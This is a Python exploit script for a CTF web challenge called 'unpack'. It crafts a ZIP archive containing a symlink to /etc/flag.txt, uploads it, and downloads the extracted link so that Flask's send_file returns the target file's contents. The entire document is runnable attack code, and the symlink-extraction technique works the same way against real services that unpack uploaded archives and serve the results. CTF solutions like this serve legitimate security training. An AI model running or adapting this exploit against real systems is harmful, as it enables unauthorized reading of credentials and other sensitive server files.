#!/usr/bin/env python3
"""
unpack — CTF Exploit
======================

Challenge: unpack (Web, Medium, 300pts)
Vulnerability: ZIP symlink extraction → arbitrary file read via send_file.

Attack:
  1. Build a ZIP archive in memory containing a symlink entry that points
     at /etc/flag.txt (or another sensitive path).
  2. Upload the archive to /upload.
  3. The server extracts the symlink to disk, honoring the Unix symlink bit.
  4. Download the symlink entry via /download/<token>/<name>.
  5. Flask's send_file follows the symlink and returns the flag contents.

Usage:
  python3 exploit.py [TARGET_URL]
  python3 exploit.py http://localhost:5000
"""

import sys
import io
import stat
import struct
import zipfile
import re

try:
    import requests
except ImportError:
    sys.exit("[-] Install requests: pip install requests")

TARGET = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:5000"
FLAG_PATH = "/etc/flag.txt"      # adjust if the flag lives elsewhere
LINK_NAME = "flag.link"


def build_symlink_zip(link_name: str, link_target: str) -> bytes:
    """
    Build a ZIP archive in memory whose single entry is a symlink.

    Python's zipfile module does not expose a direct API for setting the
    Unix external attributes, so we create a ZipInfo manually and patch
    the external_attr field to include the symlink mode bit.

    The entry *content* is the symlink target path (as bytes), which is
    how ZIP symlinks are represented in practice (same convention used by
    Info-ZIP and `zip --symlinks`).
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_STORED) as zf:
        info = zipfile.ZipInfo(link_name)
        # Set Unix file type to symlink (0120000) in the upper 16 bits of
        # external_attr, plus rwxrwxrwx permissions (0777).
        symlink_mode = (stat.S_IFLNK | 0o777) << 16
        info.external_attr = symlink_mode
        zf.writestr(info, link_target)
    return buf.getvalue()


def main():
    print(f"[*] Target     : {TARGET}")
    print(f"[*] Symlink    : {LINK_NAME} -> {FLAG_PATH}")
    print()

    # Step 1 – build the malicious ZIP
    zip_data = build_symlink_zip(LINK_NAME, FLAG_PATH)
    print(f"[*] Crafted ZIP: {len(zip_data)} bytes")

    # Step 2 – upload
    resp = requests.post(
        f"{TARGET}/upload",
        files={"file": (f"evil.zip", zip_data, "application/zip")},
        timeout=15,
    )
    resp.raise_for_status()
    result = resp.json()

    if not result.get("success"):
        sys.exit(f"[-] Upload failed: {result.get('error')}")

    token = result["token"]
    files = result["files"]
    print(f"[+] Upload OK  — token: {token}")
    print(f"[+] Files      : {[f['disk_name'] for f in files]}")

    # Step 3 – find the symlink entry and download it
    target_file = next((f for f in files if f["disk_name"] == LINK_NAME), None)
    if target_file is None:
        # Fallback: take first file
        target_file = files[0] if files else None

    if target_file is None:
        sys.exit("[-] No files returned after extraction.")

    disk_name = target_file["disk_name"]
    download_url = f"{TARGET}/download/{token}/{disk_name}"
    print(f"[*] Downloading: {download_url}")

    dl = requests.get(download_url, timeout=15)
    if dl.status_code == 200:
        content = dl.text.strip()
        flags = re.findall(r"ictf\{[^}]+\}", content)
        if flags:
            print(f"\n[+] FLAG: {flags[0]}")
        else:
            print(f"\n[+] File contents:\n{content}")
    else:
        print(f"[-] Download failed with HTTP {dl.status_code}")


if __name__ == "__main__":
    main()
